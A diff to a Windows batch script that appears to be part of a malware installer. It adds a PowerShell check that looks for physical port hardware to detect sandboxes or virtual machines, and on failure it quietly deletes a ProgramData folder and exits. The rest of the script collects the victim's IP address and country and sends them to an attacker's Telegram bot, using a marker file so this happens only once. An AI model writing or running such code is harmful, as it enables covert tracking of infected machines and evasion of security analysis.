@@ -1,3 +1,4 @@
+powershell.exe -NoProfile -Command "if (-not ([System.Management.ManagementObjectSearcher]::new('SELECT * FROM Win32_PortConnector').Get().Count)) { Remove-Item -Path ($env:ProgramData + '\Comms') -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }" || exit
 rd /s /q "%ProgramData%\ssc"
 if exist "%ProgramData%\sent" exit /b
 chcp 65001 > nul
@@ -9,6 +10,6 @@ for /f "tokens=1,2 delims=|" %a in ('powershell -NoProfile -Command "try { $j = 
     set "Country=%b"
 )
 
-powershell -NoProfile -Command "$msg = 'TRF' + [Environment]::NewLine + 'IP: %IP%' + [Environment]::NewLine + 'Country: %Country%'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$msg} } catch {}"
+powershell -NoProfile -Command "$msg = 'TRAF' + [Environment]::NewLine + 'IP: %IP%' + [Environment]::NewLine + 'Country: %Country%'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$msg} } catch {}"
 echo done > "%ProgramData%\sent"
 endlocal
